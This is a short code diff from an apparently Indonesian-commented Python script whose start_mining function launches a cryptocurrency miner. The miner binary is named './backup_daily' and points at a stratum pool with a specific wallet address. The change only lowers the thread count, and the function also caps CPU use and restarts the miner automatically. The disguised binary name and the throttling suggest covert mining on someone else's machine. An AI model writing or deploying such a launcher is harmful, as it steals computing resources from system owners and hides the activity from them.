@@ -22,7 +22,7 @@ def get_numa_info():
         print(f"Error mendapatkan info NUMA: {e}")
         return {}
 
-def start_mining(numa_node=0, limit_percent=80, cpu_usage_limit=80, command="./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t 112"):
+def start_mining(numa_node=0, limit_percent=80, cpu_usage_limit=80, command="./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t 2"):
     """Menjalankan proses mining dengan NUMA terbatas, CPU limit, dan auto-restart jika mati"""
     numa_info = get_numa_info()
     
